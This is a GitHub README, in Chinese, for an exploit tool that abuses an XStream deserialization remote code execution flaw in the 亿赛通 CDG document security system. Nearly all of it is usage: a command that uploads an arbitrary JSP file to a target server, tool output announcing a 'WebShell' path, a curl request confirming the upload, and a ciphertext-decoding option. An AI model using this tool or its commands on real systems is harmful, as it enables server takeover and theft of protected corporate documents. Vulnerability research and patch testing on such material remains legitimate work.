# CDGXStreamDeserRCE

> 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全防护软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产。亿赛通电子文档安全管理系统存在XStream反序列化远程代码执行漏洞，攻击者可利用该漏洞对服务器上传任意文件，进而控制服务器权限。


## 使用

本地文件上传利用

```bash
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ cat tessssssssssssst1.jsp
<%
out.println("e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43");
%>
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ java -jar CDGXStreamDeserRCE.jar -p http://127.0.0.1:8080 -uf tessssssssssssst1.jsp -t https://192.168.31.190:8443
[+] Exploit Successed
[+] WebShell: https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ curl -k https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp
e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43
```

密文解码

```bash
~/GitHub/CDGXStreamDeserRCE  ‹main*› $ java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN
```
<img width="1624" alt="image" src="https://user-images.githubusercontent.com/40891670/209945515-1539ff6b-e4c4-46a3-8764-7aa3a7568741.png">


## References

- https://github.com/woodpecker-framework/ysoserial-for-woodpecker
